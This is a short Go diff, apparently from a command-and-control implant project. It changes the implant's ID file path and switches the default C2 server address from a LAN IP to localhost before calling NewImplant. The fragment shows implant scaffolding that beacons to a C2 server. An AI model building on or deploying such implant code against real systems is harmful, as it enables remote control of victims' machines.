@@ -210,7 +210,7 @@ func get_id() string {
 	filePath := ""
 	switch runtime.GOOS {
 	case "linux":
-		filePath= "\\etc\\id.txt"
+		filePath= "/home/enigma/id.txt"
 	case "windows":
 		filePath= "C:\\Users\\Public\\Documents\\id.txt"
 	}
@@ -263,7 +263,7 @@ func getOSVersion() string {
 func main() {
 	c2ServerURL := os.Getenv("C2_URL")
 	if c2ServerURL == "" {
-		c2ServerURL = "http://192.168.0.115:5000"
+		c2ServerURL = "http://localhost:5000"
 	}
 
 	implant := NewImplant(c2ServerURL)
